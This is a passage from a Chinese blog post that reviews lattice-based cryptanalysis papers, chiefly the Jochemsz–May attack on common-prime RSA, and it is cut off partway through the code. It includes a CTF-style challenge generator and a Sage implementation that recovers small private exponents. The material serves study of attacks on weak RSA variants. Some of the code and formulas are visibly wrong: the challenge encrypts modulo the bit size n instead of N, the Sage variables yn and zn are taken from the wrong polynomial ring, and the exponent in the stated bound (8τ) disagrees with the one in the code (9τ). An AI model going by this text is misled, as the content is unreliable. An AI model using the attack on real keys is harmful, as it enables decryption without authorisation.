尚未解决的问题</h2><p>显然定理1的界 $\Delta&#x3D;O(p^{1&#x2F;4})$ ，定理2的界 $\Delta&#x3D;O(p^{1&#x2F;5})$ 。因此是否能提高 $\Delta$​ 的界值得讨论。</p><p>在 $c$ 给出但乘子 $a$ 未知的条件下也能用类似的过程预测二次生成器。</p><p>目前还不清楚当模数 $p$ 未知时如何预测二次生成器。</p><h1 id="0x03-在攻击变体-RSA-中找到具有新应用的多元多项式根的策略"><a href="#0x03-在攻击变体-RSA-中找到具有新应用的多元多项式根的策略" class="headerlink" title="0x03 在攻击变体 RSA 中找到具有新应用的多元多项式根的策略"></a>0x03 在攻击变体 RSA 中找到具有新应用的多元多项式根的策略</h1><p><a href="https://github.com/AL3XEI709/papers/blob/main/jochemszmay.pdf">Link</a></p><blockquote><p>这篇论文描述了利用<strong>格基 Coppersmith</strong> 技术计算多元模多项式<strong>小整数根</strong>的策略。应用该策略，该论文得出在多项式时间内攻击两种 <strong>RSA 变体</strong>的方法。首先是 Qiao-Lam scheme, 其利用中国剩余定理在解密过程发挥作用。然后是共素数 RSA ，其素数生成的方法能抵抗 Wiener 攻击。</p></blockquote><h2 id="1-1-jochemsz-may-方法"><a href="#1-1-jochemsz-may-方法" class="headerlink" title="1.1 jochemsz_may 方法"></a>1.1 jochemsz_may 方法</h2><p>论文开篇回顾了了 Coppersmith 以及 boneh Durfee 基于 Coppersmith 设计的针对 RSA 的攻击，并指出：找到一个小根的多项式 $f$ 的分析严重依赖于 $f$ 中出现的单项式，因此每个新的多项式都必须重新进行分析。这个工作无疑是十分繁杂的。2005年，Blomer 和 May 展示了如何寻找二元多项式小整数根的最佳界限。在本文中，我们提出了一种启发式策略，适用于所有多元多项式；无论是具有模数根还是整数根。</p><h2 id="1-2-参数的设定"><a href="#1-2-参数的设定" class="headerlink" title="1.2 参数的设定"></a>1.2 参数的设定</h2><p>令多项式 $f(x,ym,z)&#x3D;a_0+a_1x+a_2x^2+a_3y+a_4z+a_5xy+a_6xz+a_7yz$ 有小根 $(x^0,y^0,z^0)$ ，$x,y,z$ 的上界分别为 $X,Y,Z$ 。根据论文提出的新策略，所有小根都能有效的在多项式时间 $logW$ 内恢复出来，前提是满足<br>$$<br>X^{(7+8\tau+3\tau^2)}(YZ)^{5+\frac{9}{2}\tau}&lt;W^{3+3\tau-\epsilon}<br>$$<br>同时，论文明确给出 $W&#x3D;||f(x_1X_n,\dots,x_nX_n)||<em>\infty$ ，而 $||f(x_1,\dots,x_n)||</em>{\infty}$ 的意思就是多项式的最大系数，所以 $W$ 就是多项式对各 $x$ 进行 $Xx$ 代入后的最大系数。举个例子，如 $f&#x3D;2x^2+3x+4$ ， $X&#x3D;2$ ，则 $||f(x_1X_n,\dots,x_nX_n)||&#x3D;8x^2+6x+4$ ，显然最大系数在 $x^2$ ，即 $W&#x3D;8$ 。</p><h2 id="1-3-对-共素-RSA-的攻击"><a href="#1-3-对-共素-RSA-的攻击" class="headerlink" title="1.3 对 共素 RSA 的攻击"></a>1.3 对 共素 RSA 的攻击</h2><p><strong>定理1.</strong> 对任意 $\epsilon&gt;0$ , 存在 $n$ 使以下成立：令$N&#x3D;pq$ 为 $n$ 比特 的 RSA 模数，$p,q$ 为 $\frac{n}{2}$ 比特的素数，且 $p-1&#x3D;2ga,q-1&#x3D;2gb$ , $g$ 位数为 $\gamma n$ ，$0&lt;\gamma&lt;\frac{1}{2}$ 。令 $ed\equiv1\mod {2gab}$ , $bitsize(e)&#x3D;(1-\gamma)n,bitsize(d)&#x3D;\delta n$ , 其中 $0&lt;\delta&lt;(1-\gamma n)$ , 则 $d$ 可以在<br>$$<br>\delta&lt;\frac{1}{4}(4+4\gamma-\sqrt{13+20\gamma+4\gamma^2})-\epsilon<br>$$<br>的前提下，在多项式时间  $\log N$ 时间内求出。</p><p>由上式可得：<br>$$<br>ed&#x3D;1+k(p-1)b,ed&#x3D;1+k(q-1)a<br>$$<br>联立两个式子：$e^2d^2+ed(ka+kb-2)-(N-1)k^2ab-(ka+kb-1)&#x3D;0$ 。这个方程也可以写成 $f(x,y,z)&#x3D;e^2x^2+ex(y+z-2)-(y+z-1)z-(N-1)yz$ , 它的小根为 $(d,ka,kb)$ , 上界为 $X&#x3D;N^\delta,Y&#x3D;N^{\delta+\frac{1}{2}-\gamma},Z&#x3D;N^{\delta+\frac{1}{2}-\gamma}$ 。同时也可以算出 $W&#x3D;N^{2+2\gamma-2\delta}$  。</p><p>论文给出了几个实现攻击需要的参数列表。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202403031656231.png" alt="image-20240303165643981"> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">4092</span> </span><br><span class="line">gamma = <span class="number">0.4</span></span><br><span class="line">delta = <span class="number">0.1604</span></span><br><span class="line">flag = <span class="string">b&#x27;AL3XEI_FAKE_FLAG&#x27;</span> </span><br><span class="line"></span><br><span class="line">g = getPrime(<span class="built_in">int</span>(n*gamma)) </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(n//<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)%(<span class="number">2</span>*g) == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = getPrime(n//<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">if</span> (q-<span class="number">1</span>)%(<span class="number">2</span>*g) == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">a, b = (p-<span class="number">1</span>)//(<span class="number">2</span>*g), (q-<span class="number">1</span>)//(<span class="number">2</span>*g) </span><br><span class="line">N = p*q </span><br><span class="line">d = getPrime(<span class="built_in">int</span>(n*delta)) </span><br><span class="line">e = inverse_mod(d, <span class="number">2</span>*g*a*b) </span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag) </span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="comment"># references: https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%03d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort_monomials</span>(<span class="params">monomials</span>):</span><br><span class="line">    x, y, z = monomials[<span class="number">0</span>].parent().gens()</span><br><span class="line">    Mx = []</span><br><span class="line">    My = []</span><br><span class="line">    Mz = []</span><br><span class="line">    degx = <span class="built_in">max</span>([monomial.degree(x) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials])</span><br><span class="line">    degy = <span class="built_in">max</span>([monomial.degree(y) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials])</span><br><span class="line">    degz = <span class="built_in">max</span>([monomial.degree(z) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degx + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(degy + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(degz + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> k+j &gt; i:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials:</span><br><span class="line">                    Mx += [mono]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(degy + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(degz + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degx + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> k &gt; j:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials <span class="keyword">and</span> mono <span class="keyword">not</span> <span class="keyword">in</span> Mx:</span><br><span class="line">                    My += [mono]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(degz + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(degy + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degx + <span class="number">1</span>):</span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials <span class="keyword">and</span> mono <span class="keyword">not</span> <span class="keyword">in</span> (Mx+My):</span><br><span class="line">                    Mz += [mono]</span><br><span class="line">    <span class="keyword">return</span> Mx + My + Mz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jochemsz_may_trivariate</span>(<span class="params">pol, XX, YY, ZZ, WW, tau, mm</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Implementation of Finding roots of trivariate polynomial [1].</span></span><br><span class="line"><span class="string">    Thanks @Bono_iPad</span></span><br><span class="line"><span class="string">    References: </span></span><br><span class="line"><span class="string">        [1] Ellen Jochemsz and Alexander May. &quot;A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants&quot;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    tt = floor(mm * tau)</span><br><span class="line">    cond = XX^(<span class="number">7</span> + <span class="number">9</span>*tau + <span class="number">3</span>*tau^<span class="number">2</span>) * (YY*ZZ)^(<span class="number">5</span>+<span class="number">9</span>/<span class="number">2</span>*tau) &lt; WW^(<span class="number">3</span> + <span class="number">3</span>*tau)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;[+] Bound check: X^&#123;7+9tau+3tau^2&#125; * (YZ)^&#123;5+9/2tau&#125; &lt; W^&#123;3+3tau&#125;:&#x27;</span>, )</span><br><span class="line">    <span class="keyword">if</span> cond:</span><br><span class="line">        <span class="built_in">print</span>( <span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;NG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Polynomial constant coefficient (a_0) must be 1</span></span><br><span class="line">    <span class="comment"># <span class="doctag">XXX:</span> can a_0 be zero?</span></span><br><span class="line">    f_ = pol</span><br><span class="line">    a0 = f_.constant_coefficient()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, XX) != <span class="number">1</span>:</span><br><span class="line">        XX += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, YY) != <span class="number">1</span>:</span><br><span class="line">        YY += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, ZZ) != <span class="number">1</span>:</span><br><span class="line">        ZZ += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, WW) != <span class="number">1</span>:</span><br><span class="line">        WW += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    RR = WW * XX^(<span class="number">2</span>*(mm-<span class="number">1</span>)+tt) * (YY*ZZ)^(mm-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> a0 != <span class="number">0</span>:</span><br><span class="line">        F = Zmod(RR)</span><br><span class="line">        PK = PolynomialRing(F, <span class="string">&#x27;xs, ys, zs&#x27;</span>)</span><br><span class="line">        f_ = PR(PK(f_) * F(a0)^-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct set `S` (cf.[1] p.8)</span></span><br><span class="line">    S = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i2, i3 <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">0</span>, mm), repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2</span>*(mm-<span class="number">1</span>) - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">            S.add(x^i1 * y^i2 * z^i3)</span><br><span class="line">    m_S = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mm):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(mm):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*(mm-<span class="number">1</span>) - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">                m_S += [x^i*y^j*z^k]</span><br><span class="line">    S = m_S</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct set `M` (cf.[1] p.8)</span></span><br><span class="line">    M = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i2, i3 <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">0</span>, mm + <span class="number">1</span>), repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2</span>*mm - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">            M.add(x^i1 * y^i2 * z^i3)</span><br><span class="line">    M_S = <span class="built_in">list</span>(M - <span class="built_in">set</span>(S))</span><br><span class="line"></span><br><span class="line">    m_M_S = []</span><br><span class="line">    deg_x = <span class="built_in">max</span>([mono.degree(x) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    deg_y = <span class="built_in">max</span>([mono.degree(y) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    deg_z = <span class="built_in">max</span>([mono.degree(z) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(deg_z + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(deg_y + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(deg_x + <span class="number">1</span>):</span><br><span class="line">                mono = x^i*y^j*z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> M_S:</span><br><span class="line">                    m_M_S += [mono]</span><br><span class="line">    M_S = m_M_S</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct polynomial `g`, `g&#x27;` for basis of lattice</span></span><br><span class="line">    g = []</span><br><span class="line">    g_ = []</span><br><span class="line">    M_S = sort_monomials(M_S)</span><br><span class="line">    S = sort_monomials(S)</span><br><span class="line">    <span class="keyword">for</span> monomial <span class="keyword">in</span> S:</span><br><span class="line">        i1 = monomial.degree(x)</span><br><span class="line">        i2 = monomial.degree(y)</span><br><span class="line">        i3 = monomial.degree(z)</span><br><span class="line">        g += [monomial * f_ * XX^(<span class="number">2</span>*(mm-<span class="number">1</span>)+tt-i1) * YY^(mm-<span class="number">1</span>-i2) * ZZ^(mm-<span class="number">1</span>-i3)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> monomial <span class="keyword">in</span> M_S:</span><br><span class="line">        g_ += [monomial * RR]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct Lattice from `g`, `g&#x27;`</span></span><br><span class="line">    monomials_G = []</span><br><span class="line">    monomials = []</span><br><span class="line">    G = g + g_</span><br><span class="line">    deg_x = deg_y = deg_z = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> g_poly <span class="keyword">in</span> G:</span><br><span class="line">        monomials_G += g_poly.monomials()</span><br><span class="line">        deg_x = <span class="built_in">max</span>(deg_x, g_poly.degree(x))</span><br><span class="line">        deg_y = <span class="built_in">max</span>(deg_y, g_poly.degree(y))</span><br><span class="line">        deg_z = <span class="built_in">max</span>(deg_z, g_poly.degree(z))</span><br><span class="line">    monomials_G = <span class="built_in">sorted</span>(<span class="built_in">set</span>(monomials_G))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(deg_z + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(deg_y + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(deg_x + <span class="number">1</span>):</span><br><span class="line">                mono = x^i*y^j*z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials_G:</span><br><span class="line">                    monomials += [x^i*y^j*z^k]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(monomials) == <span class="built_in">len</span>(G)</span><br><span class="line">    monomials = sort_monomials(monomials)</span><br><span class="line">    dims = <span class="built_in">len</span>(monomials)</span><br><span class="line">    M = Matrix(IntegerRing(), dims)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dims):</span><br><span class="line">        M[i, <span class="number">0</span>] = G[i](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dims):</span><br><span class="line">            <span class="keyword">if</span> monomials[j] <span class="keyword">in</span> G[i].monomials():</span><br><span class="line">                M[i, j] = G[i].monomial_coefficient(monomials[j]) * monomials[j](XX, YY, ZZ)</span><br><span class="line">    matrix_overview(M)</span><br><span class="line">    <span class="built_in">print</span> ()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;=&#x27;</span> * <span class="number">128</span>)</span><br><span class="line">    <span class="built_in">print</span> ()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line"></span><br><span class="line">    start = time()</span><br><span class="line">    B = M.LLL()</span><br><span class="line">    matrix_overview(B)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] LLL cost %d sec&#x27;</span> % (time() - start))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Re-construct polynomial `H_i` from Reduced-lattice</span></span><br><span class="line">    H = [(i, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dims)]</span><br><span class="line">    H = <span class="built_in">dict</span>(H)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dims):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dims):</span><br><span class="line">            H[i] += PR((monomials[j] * B[i, j]) / monomials[j](XX, YY, ZZ))</span><br><span class="line"></span><br><span class="line">    PX = PolynomialRing(IntegerRing(), <span class="string">&#x27;xn&#x27;</span>)</span><br><span class="line">    xn = PX.gen()</span><br><span class="line">    PY = PolynomialRing(IntegerRing(), <span class="string">&#x27;yn&#x27;</span>)</span><br><span class="line">    yn = PX.gen()</span><br><span class="line">    PZ = PolynomialRing(IntegerRing(), <span class="string">&#x27;zn&#x27;</span>)</span><br><span class="line">    zn = PX.gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for `x`</span></span><br><span class="line">    r1 = H[<span class="number">2</span>].resultant(pol, y)</span><br><span class="line">    r2 = H[<span class="number">3</span>].resultant(pol, y)</span><br><span class="line">    r3 = r1.resultant(r2, z)</span><br><span class="line">    x_roots = <span class="built_in">map</span>(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], r3.subs(x=xn).roots())</span><br><span class="line">    x_roots = <span class="built_in">list</span>(x_roots)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(x_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x_roots) == <span class="number">1</span> <span class="keyword">and</span> x_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for `x`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    x_root = x_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;[+] Found x0 = %d&#x27;</span> % x_root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for `z`</span></span><br><span class="line">    r1_ = r1.subs(x=x_root)</span><br><span class="line">    r2_ = r2.subs(x=x_root)</span><br><span class="line">    z_roots = <span class="built_in">map</span>(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], gcd(r1_, r2_).subs(z=zn).roots())</span><br><span class="line">    z_roots = <span class="built_in">list</span>(z_roots)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(z_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(z_roots) == <span class="number">1</span> <span class="keyword">and</span> z_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for `z`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    z_root = z_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;[+] 